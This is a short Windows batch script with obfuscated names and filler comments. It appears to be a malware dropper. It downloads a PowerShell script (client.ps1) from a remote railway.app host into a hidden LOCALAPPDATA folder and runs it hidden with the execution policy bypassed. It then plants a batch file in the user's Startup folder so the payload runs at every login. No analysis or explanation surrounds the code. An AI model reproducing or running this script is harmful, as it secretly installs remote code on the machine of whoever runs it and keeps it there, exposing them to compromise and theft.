@echo off
REM Ver821
setlocal EnableDelayedExpansion
REM Ver965
REM Mod888

REM [07b6ba193f3c38f3b704203994b7be23]

set "c03a057a=%LOCALAPPDATA%\f2b2b4e75e"
set "20569029=https://web-production-9d7cc.up.railway.app/client.ps1"
set "26638a07=%c03a057a%\7603d6b47b.ps1"

REM Proc948
if not exist "%c03a057a%" mkdir "%c03a057a%"

REM Sys318
powershell -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%20569029%','%26638a07%');Start-Process powershell -ArgumentList '-w hidden -ep bypass -f \"%26638a07%\"' -WindowStyle Hidden"

REM Core914
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup%\68a945.bat" (
    echo @echo off> "%startup%\68a945.bat"
    echo powershell -w hidden -ep bypass -f "%26638a07%">> "%startup%\68a945.bat"
)

REM Core170
exit /b 0

REM [BDDE9A531B824E570DC0F6CE]
